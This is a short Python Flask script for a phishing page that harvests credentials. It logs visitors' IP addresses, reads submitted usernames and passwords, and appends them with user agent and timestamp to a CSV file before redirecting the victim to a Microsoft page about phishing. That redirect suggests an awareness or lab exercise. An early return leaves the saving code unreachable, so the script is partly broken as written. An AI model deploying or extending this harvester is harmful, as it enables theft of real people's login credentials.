# before we start this script install flask

# pip install flask

from flask import Flask, request, render_template, redirect
import csv
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def home():
    # when someone logs in
    print(f"[{datetime.now()} Visit detected from {request.remote_addr}]")
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    # what can handle the data
    return f'Username: {username}, Password: {password}'
    print(f'Username: {username}, Password: {password}')

    # Capture telemetry (Soc Analysts will love this)
    user_agent = request.headers.get('User-Agent')
    ip_address = request.remote_addr
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Save to our CSV "database"
    with open('credentials.csv', 'a', newline='') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(['Username:',username,'Password:', password,'User_Agent:', user_agent,'IP Address:', ip_address,'Timestamp:', timestamp])
    print(f"[!] SUCCESS: Captured credentials for {username} from {ip_address} at {timestamp}")
    return redirect("https://www.microsoft.com/en-us/security/business/security-101/what-is-phishing")


if __name__ == '__main__':
    app.run(debug=True)
    # add where you want to send this too
    app.run(host='0.0.0.0', port=5000)
